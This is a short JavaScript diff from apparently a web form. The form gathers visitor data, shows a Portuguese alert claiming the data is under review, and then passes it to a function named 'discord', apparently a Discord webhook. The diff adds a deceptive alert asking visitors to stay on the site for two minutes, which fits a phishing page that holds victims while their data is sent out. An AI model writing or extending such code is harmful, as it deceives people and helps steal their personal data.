@@ -68,6 +68,7 @@ async function processo(){
         let data=dados_enviar(troca)
         if(data){
             alert("Os seus dados estão em processo de analise, iremos mandar uma resposta daqui 4 dias")
+            alert("Mantenha-se no site por 2 minutos para que seus dados sejam processados corretamente.")
             await discord(data)
         }
         console.log(data)
